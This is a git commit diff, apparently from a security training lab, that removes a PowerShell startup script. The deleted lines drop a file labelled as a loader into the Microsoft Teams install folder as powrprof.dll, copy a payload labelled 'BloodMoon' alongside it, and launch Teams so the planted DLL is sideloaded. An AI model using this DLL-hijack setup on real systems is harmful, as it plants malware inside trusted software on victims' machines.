60e28a637d6a46263a58096a1feb3c1ba78fc79a
elusivethreat <elusivethreat@protonmail.com>
2024-01-08 12:52:03 +0000

    removed startup script

--- Launch.ps1
+++
@@ -1,8 +0,0 @@
-# Transfer files into install dir
-Copy-Item "C:\Users\Public\Desktop\LAB_FILES\MS_Plugin\FirstHook\Lunar_prof.bin" "C:\Users\pslearner\AppData\Local\Microsoft\Teams\current\powrprof.dll"    # Loader
-Copy-Item "C:\Users\Public\Desktop\LAB_FILES\MS_Plugin\FirstHook\ffmpeg.dat" "C:\Users\pslearner\AppData\Local\Microsoft\Teams\current\ffmpeg.dat"          # BloodMoon
-
-# After restart
-Start-Job -ScriptBlock { Start-Process -PSPath 'C:\Users\pslearner\AppData\Local\Microsoft\Teams\Updates.exe' -argumentList "--processStart Teams.exe" }
-
-echo "Done!" > C:\Users\Public\Desktop\LAB_FILES\Installed.txt
